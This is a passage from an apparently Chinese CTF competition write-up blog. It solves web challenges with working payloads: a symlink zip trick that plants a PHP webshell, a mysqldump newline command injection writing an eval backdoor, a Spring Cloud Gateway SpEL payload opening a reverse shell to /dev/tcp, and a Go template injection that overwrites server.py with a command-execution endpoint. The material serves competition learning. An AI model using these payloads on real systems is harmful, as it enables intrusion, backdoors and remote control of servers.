invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析源码 我们上传上去的压缩包会被修改为tmp_name 并且路径是&#x2F;tmp我们也是访问不到的</p><p>我们能访问到的只能是默认web环境下 也就是&#x2F;var&#x2F;www&#x2F;html</p><p>再根据题目描述是unzip所导致的问题 </p><p>看了wp 是根据软链接这里可以理解为是win的快捷方式</p><p>先来看<code>unzip -o</code>这是这道题的前提</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685372533414-f6c6b521-1d9d-43f8-bafc-f94ea40e22d0.png" alt="img"></p><p>我们能够通过解压覆盖原有的文件</p><p>我们可以先创建一个软链接文件test 指向&#x2F;var&#x2F;www&#x2F;html 然后打包test.zip上传上去</p><p> <code>ln -s /var/www/html test</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373327803-af16dd07-a6f5-4219-a6ae-1f78d17dc4ab.png" alt="img"></p><p>这里的<strong>符号链接其实就是软链接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -y test.zip test</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373416181-10436723-6c28-4452-9cb2-34facb735c6b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373504644-d86c7ed4-d3ef-4c2e-a63b-39aa142ffbca.png" alt="img"></p><p>再写一个一句话木马 放到test文件中 打包test2.zip上传上去</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373611970-09deda72-3b51-43b9-91d3-f689aed9ad94.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r test2.zip test</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373698097-122e454b-4967-4295-a0d2-e6d4097fda8f.png" alt="img"></p><p>因为是test文件下有个test.php（我们的木马） 所以要递归处理</p><p>当test.zip被解压后 会有一个指向&#x2F;var&#x2F;www&#x2F;html 的软链接文件test 然后接着test2.zip被解压后 同名软链接文件test 会被覆盖然后  但是test目录软链接指向&#x2F;var&#x2F;www&#x2F;html 解压的时候会把test文件中的test.php放在&#x2F;var&#x2F;www&#x2F;html，此时我们达到了getsehll的目的，这里思路一定要捋清。</p><p>然后访问<code>/test.php</code>即可</p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>一道mysqldump rce的题目 跟sql注入没一点关系 题目中也提示了 rce </p><p>我像个铸币一样一直在试闭合方式去构造奇怪的注入点 我脑子有问题是吧</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>其实这道题目对我来说rce点我找不到 这是一个见多识广的结果</p><p>根据大佬的wp dump出日志其实是通过命令执行实现的 ，我们看的那个日志功能大概率不是日志，而是mysqldump这个工具用来备份数据库的，所以这里应该直接执行的程序命令，所以能换行符RCE </p><p>通过换行符<code>%0a</code>绕一下</p><p>然后直接rce 如果直接读flag是不行的 估计预期解要涉及提权问题 </p><p>但是出题人这里没有把环境变量删了 导致直接读环境变量就出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0Aenv</span><br></pre></td></tr></table></figure><p>还有另一种是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag1%0aecho &quot;&lt;?php @eval(getallheaders()[&#x27;Cookie&#x27;])?&gt;&quot; &gt; &quot;/app/log/1.php&quot;</span><br></pre></td></tr></table></figure><p>这里过滤了<code>$</code>可以通过<code>getallheaders()</code>截取请求头方式bypass</p><p>这种做法其实我最想问这个&#x2F;app&#x2F;log路径是怎么来的 </p><p>我当时做通过报错只能获取的路径只有<code>/log</code></p><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>考点：一道结合身份认证绕过和Nacos结合Spring Cloud Gateway RCE利用的题目 </p><p>首先是Nacos身份认证绕过漏洞 参考<a href="https://www.secpulse.com/archives/199642.html">https://www.secpulse.com/archives/199642.html</a></p><p>这道题目复现环境是在ctfshow下 当时国赛身份认证绕过参考的是<a href="https://www.secpulse.com/archives/199642.html">https://www.secpulse.com/archives/199642.html</a></p><p>这里稍稍不同</p><p>请求包如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /v1/auth/users HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">9</span>b464143-e8ce-<span class="number">4</span>ca3-a70c-<span class="number">25</span>ee32dc6c66.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">27</span></span><br><span class="line">Accept: application/json, text/plain, *<span class="comment">/*</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Origin: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show</span></span><br><span class="line"><span class="comment">Referer: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=test&amp;password=test</span></span><br></pre></td></tr></table></figure><p>之后来到后台</p><p>接着就是跟着<a href="https://xz.aliyun.com/t/11493#toc%E5%A4%8D%E7%8E%B0">https://xz.aliyun.com/t/11493#toc复现</a> 动态配置路由达到RCE</p><p>添加一个配置</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685460978092-86e17559-963c-4cee-8180-0b9b65121836.png" alt="img"></p><p>这里添加时Data ID 要根据题目给的附件 去查看java源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461072802-d7056ff3-982c-4bb1-b1e6-d09e4c1a63c3.png" alt="img"></p><p>配置内容参考前面文章中的 </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">exam</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://service-provider</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/echo/**</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddResponseHeader</span></span><br><span class="line">              <span class="attr">args:</span></span><br><span class="line">                <span class="attr">name:</span> <span class="string">result</span></span><br><span class="line">                <span class="attr">value:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>但是格式要转为json源码中也提到了</p><p>注意这里原文章给的payload格式是yaml 根据源码需要json格式 找个在线网站转一下格式即可</p><p>这里我一开始这个payload 格式 看来看去难道要手动转json格式吗 亏贼，而且这个格式好眼熟，之后好好想了一下原来是省赛的时候呢到yaml反序列化 学过这个格式 我就说格式好眼熟啊</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461002172-6b4caeae-7103-4aa0-ac22-28ae200aba08.png" alt="img"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span><span class="string">&quot;lb://backendservice&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;predicates:&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;Path=/test/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;RewritePath&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;replacement&quot;</span><span class="punctuation">:</span><span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>反弹shell 即可  但是有时候弹不成功 环境问题</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685462609893-09c39cf1-624e-4597-8b3b-9751bc72f3e6.png" alt="img"></p><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">    <span class="string">&quot;html&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">        session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        err = session.Save(c.Request, c.Writer)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">        http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">    xssWaf := html.EscapeString(name)</span><br><span class="line">    tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">    c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了源码发现要进行session伪造，当时做题的时候以为类似于falsk的session伪造 去网上找脚本 但是都没运行成功 并且也不知道key 就寄了</p><p>复现的时候看了大佬的WP key是空值 麻了 这里就需要本地来搭建一下 此前零接触go 所以搭建很费力 请了亮sensei帮我弄 </p><p>搭建好本地环境之后 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685710841251-127825a0-1f2b-400c-bda0-f3588de2f64d.png" alt="img"></p><p>修改这两个地方 本地启动抓包 将session 复制到题目上去直接就可以了（这里注意要删除原来的session 然后刷新一下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTY4NTcwODk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxfaogJnkxqBjr0zeT-y8vTmXMwFnxOaUC4_0fBoWEhUA==</span><br></pre></td></tr></table></figure><p>然后就有两个接口<code>/admin``/flask</code></p><p>国赛环境下当时<code>/flask?name=/</code>就会报错 报错界面暴露可以算pin码，也就是debug开启的，但是这道题目没法通过算pin码来做出来 看亮师傅wp是因为这道题目可以文件热部署（也就是不用通过重新编译来达到更新目的 后台直接修改更新即可）</p><p>再来看<code>/admin</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;)</code>直接来看这里 就是模板注入pongo2的模板注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;)</span><br></pre></td></tr></table></figure><p><code>tpl.execute</code>把c也放进去了的，这个c代表着gin里的上下文对象，可以引用Context下的所有函数了 </p><p>  gin.Context 里面包装了 Request 和 ResponseWriter, 这里大佬的WP用的 <code>Request.UserAgent()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserAgent returns the client&#x27;s User-Agent, if sent in the request.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Request)</span></span> UserAgent() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.Header.Get(<span class="string">&quot;User-Agent&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload: <code>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</code></p><p>偷的大佬的数据包 直接覆盖源码 server.py</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125; HTTP/1.1</span><br><span class="line">Host: node1.anna.nssctf.cn:28272</span><br><span class="line">Content-Length: 611</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">User-Agent: /app/server.py</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">Content-Disposition: form-data; name=&quot;/app/server.py&quot;; filename=&quot;server.py&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shell&#x27;)</span><br><span class="line">def shell():</span><br><span class="line">cmd = request.args.get(&#x27;cmd&#x27;)</span><br><span class="line">if cmd:</span><br><span class="line">return os.popen(cmd).read()</span><br><span class="line">else:</span><br><span class="line">return &#x27;shell&#x27;</span><br><span class="line"></span><br><span class="line">if __name__== &quot;__main__&quot;:</span><br><span class="line">app.run(host=&quot;127.0.0.1&quot;,port=5000,debug=True)</span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;#25552;</span><span class="symbol">&amp;#20132;</span></span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi--</span><br></pre></td></tr></table></figure><p><code>/flask?name=/shell?cmd=ls$&#123;IFS&#125;/</code> 这里过滤了空格</p><p>命令执行就行了 tql 这里其实还有很多知识 这里不太懂说起来很难受 以后再强点 再来补坑吧 </p><p>Web就到这里 其他题目对于我来说还在未知领域等我去探索。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>根据提示<code>print(open(&#39;flag&#39;).read())</code>就出了</p><h2 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a><strong>被加密的生产流量</strong></h2><p>题目描述：</p><p>某安全部门发现某涉密工厂生产人员偷偷通过生产网络传输数据给不明人员，通过技术手段截获出一段通讯流量，但是其中的关键信息被进行了加密，请你根据流量包的内容，找出被加密的信息。</p><p>应该直接去过滤通讯流量 找到MODBUS协议   追踪流一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376104279-3591a49e-3805-4ed5-9e56-bcca3cfbba1f.png" alt="img"></p><p>组合起来发现base32编码 因为末尾有等号并且只有大写和数字的编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMYWMX3GNEYWOXZRGAYDA===</span><br></pre></td></tr></table></figure><p><img 